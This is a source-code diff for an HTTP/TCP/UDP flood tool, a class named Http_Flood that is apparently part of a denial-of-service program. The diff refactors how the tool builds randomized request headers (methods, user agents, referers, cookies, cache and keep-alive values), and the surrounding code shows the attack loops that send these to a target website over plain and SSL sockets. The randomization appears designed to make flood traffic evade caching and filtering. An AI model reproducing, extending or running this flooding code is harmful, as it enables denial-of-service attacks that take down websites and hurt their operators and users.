@@ -130,9 +130,9 @@ void Http_Flood::attack(const int *id) {
             if(!sockets[x]){
                 sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str(), conf->protocol);
             }
-            std::string header{};
-            init_header(header);
-            if((r = write_socket(sockets[x], header.c_str(), header.length())) == -1){
+            httphdr header{};
+            init_header(&header);
+            if((r = write_socket(sockets[x], header.get().c_str(), header.length())) == -1){
                 cleanup(&sockets[x]);
                 sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str(), conf->protocol);
             }else{
@@ -173,9 +173,9 @@ void Http_Flood::attack_ssl(const int *id) {
                 CTXs[x] = InitCTX();
                 SSLs[x] = Apply_SSL(sockets[x], CTXs[x]);
             }
-            std::string header{};
-            init_header(header);
-            if((r = write_socket(SSLs[x], header.c_str(), static_cast<int>(header.length()))) == -1){
+            httphdr header{};
+            init_header(&header);
+            if((r = write_socket(SSLs[x], header.get().c_str(), static_cast<int>(header.length()))) == -1){
                 cleanup(SSLs[x], &sockets[x], CTXs[x]);
                 sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str(), conf->protocol);
                 CTXs[x] = InitCTX();
@@ -213,39 +213,31 @@ const SSL_METHOD *Http_Flood::GetMethod() {
     }
 }
 
-void Http_Flood::init_header(std::string& header) {
+void Http_Flood::init_header(httphdr *header) {
     switch (conf->vector){
         case Config::UDPFlood:
         case Config::TCPFlood:
-            header += Randomizer::randomstr();
+            header->overide(const_cast<std::string &>(Randomizer::randomstr()));
             break;
         case Config::HTTP:{
-            auto http = std::make_unique<httphdr>();
-            http->setMethod(const_cast<std::string &>(Randomizer::random_method()));
+            header->method = Randomizer::random_method();
             if(conf->RandomizeHeader){
-                http->setLocation(const_cast<std::string &>(Randomizer::randomstr()));
+                header->location = Randomizer::randomstr();
             }
-            http->setUseragent(const_cast<std::string &>(Randomizer::random_useragent(*(conf->useragents))));
-            http->setCacheControl(const_cast<std::string &>(Randomizer::random_caching()));
-            http->setEncoding(const_cast<std::string &>(Randomizer::random_encoding()));
-            http->setCharset(const_cast<std::string &>(Randomizer::random_charset()),
-                             const_cast<std::string &>(Randomizer::random_charset()));
-            http->setReferer(const_cast<std::string &>(Randomizer::random_referer()));
-            http->setAccept((std::string &) "*/*");
-            http->setConnectionType((std::string &) "Keep-Alive");
-            http->setContentType(const_cast<std::string &>(Randomizer::random_contenttype()));
-            http->setCookie(const_cast<std::string &>(Randomizer::randomstr()),
-                            const_cast<std::string &>(Randomizer::randomstr()));
-            http->setKeepAlive(Randomizer::randomInt(1, 5000));
-            http->setDNT(Randomizer::randomInt(0, 1));
-
-            header += http->get();
+            header->useragent = Randomizer::random_useragent(*(conf->useragents));
+            header->cache_control = Randomizer::random_caching();
+            header->encoding = Randomizer::random_encoding();
+            header->charset = {Randomizer::random_charset(), Randomizer::random_charset()};
+            header->referer = Randomizer::random_referer();
+            header->accept = "*/*";
+            header->connection_type = "Keep-Alive";
+            header->content_type = Randomizer::random_contenttype();
+            header->cookie = {Randomizer::randomstr(), Randomizer::randomstr()};
+            header->keep_alive = Randomizer::randomInt(1, 5000);
+            header->DNT = Randomizer::randomInt(0, 1);
+            header->generate();
             break;
         }
         default:break;
     }
-}
-
-void Http_Flood::init_header(std::string& header, bool) {
-
 }
